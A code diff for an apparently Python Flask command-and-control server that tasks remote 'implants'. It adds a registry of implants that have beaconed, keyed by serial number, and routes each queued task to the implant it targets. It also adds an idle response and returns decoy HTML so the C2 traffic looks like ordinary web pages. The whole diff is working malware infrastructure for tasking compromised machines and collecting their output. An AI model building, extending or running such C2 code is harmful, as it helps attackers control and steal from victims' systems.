@@ -70,6 +70,13 @@ kmodsRootDir = "/kmods/"
 # GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
 TaskFifo = deque()
 
+# repository of implants that beaconed to C2 server at least once
+# dictionary stores lists[] of implants' essential info. Dictionary uses 'SN' (implant's serial number) as its key.
+ImplantDict = dict()
+
+# dictionary stores lists[] of taskIDs assigned to given implant's 'SN'. Dictionary uses 'SN' (implant's serial number) as its key.
+ImplantTasksDict = dict()
+
 # Repositories of:
 # 1. tasks' input data (sent from operator)
 # 2. tasks' output data (sent back from implant) that were successful
@@ -85,6 +92,7 @@ class ImplantMessageType(IntEnum):
     GET_RESOURCE = 2
     POST_RESULT = 3
     UNKNOWN = 4
+    STAY_IDLE = 5
 
 CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"
 
@@ -119,9 +127,12 @@ def netMasquerade(Task, MsgType):
         return Task
 
     elif MsgType == ImplantMessageType.POST_RESULT:
-        # TODO: return plausible HTML content
+        # return plausible HTML content
+        return "<p>roger that</p>"
 
-        return Task
+    elif MsgType == ImplantMessageType.STAY_IDLE:
+        # understood, but nothing to do, stay idle
+        return "<p>no taks</p>"
 
     elif MsgType == ImplantMessageType.UNKNOWN:
         # unrecognized request received
@@ -163,8 +174,8 @@ def addTask():
         # add unique ID to the task (taskID)
         reqData['id'] = secrets.token_hex()
 
-        # check if all required fields are present
-        if not 'name' in reqData or not 'header' in reqData:
+        # check if all required fields are present (SN - implant serial number, name and header)
+        if not 'SN' in reqData or not 'name' in reqData or not 'header' in reqData:
             return "<p>Badly formatted task!</p>"
 
         # convert JSON request to string and append it to TaskFifo 
@@ -208,9 +219,92 @@ def addTask():
 ### end of Handling operator's requests from console (adding new tasks and status display)
 
 ### Handling implant's beaconing
-def constructImplantTask(task, implant_identity):
 
-    arch, os = implant_identity.split(':')
+# GET /endpoint - check if task is available (GET_TASK handler)
+# POST /endpoint - send in task's output data (POST_RESULT handler)
+@app.route("/endpoint", methods=['GET', 'POST'])
+def heartbeat():
+    # Flask request:
+    # https://flask.palletsprojects.com/en/stable/api/#flask.Request
+
+    if request.method == 'GET':
+        msgType = ImplantMessageType.GET_TASK
+    elif request.method == 'POST':
+        msgType = ImplantMessageType.POST_RESULT
+    else:
+        msgType = ImplantMessageType.UNKNOWN
+
+    # get implant's output data and add it to the output's store under 'taskID' key (POST_RESULT handler)
+    if msgType == ImplantMessageType.POST_RESULT:
+        data, status_code, taskID = netUnmasquerade(request, msgType)
+
+        if status_code == 0:
+            data = base64.b64decode(request.get_data())
+            OutputDict[taskID] = data
+        else:
+            ErrorDict[taskID] = status_code
+
+        return netMasquerade("", ImplantMessageType.POST_RESULT)
+
+    # GET_TASK handler
+    elif msgType == ImplantMessageType.GET_TASK:
+
+        # get implant's identity (serial number - SN)
+        implant_identity = netUnmasquerade(request, msgType)
+        try:
+            _, _, serial_number = implant_identity.split(':')
+        except Exception as e:
+            print(e)
+            return netMasquerade("", ImplantMessageType.UNKNOWN)
+
+        if not implant_identity:
+            return netMasquerade("", ImplantMessageType.UNKNOWN)
+
+        #
+        # request looks legit, process it
+        #
+
+        # add/update implant's essential info list 
+        implant_record = [implant_identity]
+        ImplantDict[serial_number] = implant_record
+
+        # stay idle, if there are no tasks to process at this time
+        if len(TaskFifo) == 0:
+            return netMasquerade("", ImplantMessageType.STAY_IDLE)
+
+        # get tasking data from TaskFifo
+        task = TaskFifo.pop()
+        cmdData = json.loads(task) # deserialize to JSON
+
+        # if popped task is meant for currently beaconing implant append it ImplantTasksDict
+        # and return it in the response
+        if serial_number == cmdData['SN']:
+            # postprocess task based on operator's input and calling implant's identity
+            implantTask = constructImplantTask(cmdData, implant_identity)
+
+            # append taskID to be executed to ImplantTasksDict under 'SN' key
+            taskID = cmdData['id']
+            if ImplantTasksDict.get(serial_number) is None:
+                ImplantTasksDict[serial_number] = [taskID]
+            else:
+                ImplantTasksDict[serial_number].append(taskID)
+
+            # format / mask / obsfuscate / encode task before putting it on the wire
+            return netMasquerade(implantTask, ImplantMessageType.GET_TASK)
+
+        # else put task back to the deque and respond with STAY_IDLE
+        else:
+            data = json.dumps(cmdData)
+            TaskFifo.append(data)
+            return netMasquerade("", ImplantMessageType.STAY_IDLE)
+
+    # unrecognized reguest, go away
+    else:
+        return netMasquerade("", ImplantMessageType.UNKNOWN)
+
+def constructImplantTask(taskJSON, implant_identity):
+
+    arch, os, serial_number = implant_identity.split(':')
     if arch == "x86_64":
         arch = "x64"
     if os == "windows":
@@ -218,13 +312,13 @@ def constructImplantTask(task, implant_identity):
     else:
         os = "elf"
 
-    cmdData = json.loads(task) # deserialize to JSON
+    cmdData = taskJSON
 
     # request ID for identifying requests (task input data) with responses (tasks output)
     taskID = cmdData['id']
 
     # store task's input data for logging purposes
-    InputDict[taskID] = task
+    InputDict[taskID] = taskJSON
 
     # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
     Instruction = {
@@ -339,54 +433,6 @@ def constructImplantTask(task, implant_identity):
     # return Implant's Instruction for execution
     return Instruction
 
-
-# GET /endpoint - check if task is available (GET_TASK handler)
-# POST /endpoint - send in task's output data (POST_RESULT handler)
-@app.route("/endpoint", methods=['GET', 'POST'])
-def heartbeat():
-    # Flask request:
-    # https://flask.palletsprojects.com/en/stable/api/#flask.Request
-
-    if request.method == 'GET':
-        msgType = ImplantMessageType.GET_TASK
-    elif request.method == 'POST':
-        msgType = ImplantMessageType.POST_RESULT
-    else:
-        msgType = ImplantMessageType.UNKNOWN
-
-    # get implant's output data and add it to the output's store under 'taskID' key (POST_RESULT handler)
-    if msgType == ImplantMessageType.POST_RESULT:
-        data, status_code, taskID = netUnmasquerade(request, msgType)
-
-        if status_code == 0:
-            data = base64.b64decode(request.get_data())
-            OutputDict[taskID] = data
-        else:
-            ErrorDict[taskID] = status_code
-
-        return ""
-
-    # GET_TASK handler
-    elif msgType == ImplantMessageType.GET_TASK:
-        # abort, if there are no tasks to process
-        if len(TaskFifo) == 0:
-            return "nothing to do"
-
-        # get tasking data from TaskFifo
-        task = TaskFifo.pop()
-
-        # get implant's identification and/or authentication data
-        implant_identity = netUnmasquerade(request, msgType)
-        if not implant_identity:
-            return "go away"
-
-        # postprocess task based on operator's input and calling implant's identity
-        implantTask = constructImplantTask(task, implant_identity)
-
-        # format / mask / obsfuscate / encode task before putting it on the wire
-        return netMasquerade(implantTask, ImplantMessageType.GET_TASK)
-    else:
-        return netMasquerade("", ImplantMessageType.UNKNOWN)
 ### end of Handling implant's beaconing
 
 
